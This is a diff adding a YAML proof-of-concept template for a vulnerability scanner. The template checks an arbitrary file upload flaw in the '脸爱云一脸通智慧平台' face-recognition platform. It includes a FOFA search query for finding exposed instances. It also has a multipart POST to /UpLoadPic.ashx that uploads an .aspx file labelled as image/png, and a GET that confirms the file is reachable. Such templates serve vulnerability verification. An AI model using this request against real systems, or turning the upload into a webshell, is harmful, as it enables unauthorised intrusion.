@@ -1,0 +1,44 @@
+id: poc-yaml-lian-ai-yun-uploadpic-ashx-anyfile-upload
+info:
+  name: 脸爱云一脸通智慧平台 UpLoadPic.ashx 任意文件上传漏洞
+  severity: critical
+  tags:
+  - 文件上传
+  finger: 一脸通智慧管理平台
+  fofa: title="欢迎使用脸爱云 一脸通智慧管理平台"
+variables:
+  t1: random_str(4)
+  t2: base64(t1)
+requests:
+- method: POST
+  path: /UpLoadPic.ashx
+  headers:
+    Content-Type: multipart/form-data; boundary=----WebKitFormBoundarywt7cEu1eBdibB13u
+  data: '------WebKitFormBoundarywt7cEu1eBdibB13u
+
+    Content-Disposition: form-data; name="action"
+
+    post
+
+
+    ------WebKitFormBoundarywt7cEu1eBdibB13u
+
+    Content-Disposition: form-data; name="myPhoto"; filename="{{.t1}}.aspx"
+
+    Content-Type: image/png
+
+
+    {{.t2}}
+
+    ------WebKitFormBoundarywt7cEu1eBdibB13u
+
+    Content-Disposition: form-data; name="oldName"
+
+    ------WebKitFormBoundarywt7cEu1eBdibB13u--'
+  expression: status_code == 200 && contains(body,"images")
+  output:
+  - regex_match(body,"/(?P<path>.*).aspx")
+- method: GET
+  path: /{{.path}}.aspx
+  expression: status_code == 200 && body == t2
+transport: http
